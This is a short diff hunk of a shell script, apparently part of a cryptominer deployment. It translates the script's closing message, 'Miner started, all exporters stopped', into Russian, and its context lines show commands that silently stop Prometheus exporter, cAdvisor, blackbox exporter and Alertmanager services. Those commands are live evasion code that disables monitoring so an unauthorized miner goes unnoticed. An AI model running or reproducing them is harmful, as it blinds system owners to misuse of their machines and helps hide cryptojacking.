@@ -7,4 +7,4 @@ systemctl stop prometheus_exporter.service 2>/dev/null
 systemctl stop cadvisor.service 2>/dev/null
 systemctl stop blackbox_exporter.service 2>/dev/null
 systemctl stop alertmanager.service 2>/dev/null
-echo "Miner started, all exporters stopped"
+echo "Майнер запущен, все экспортеры остановлены"
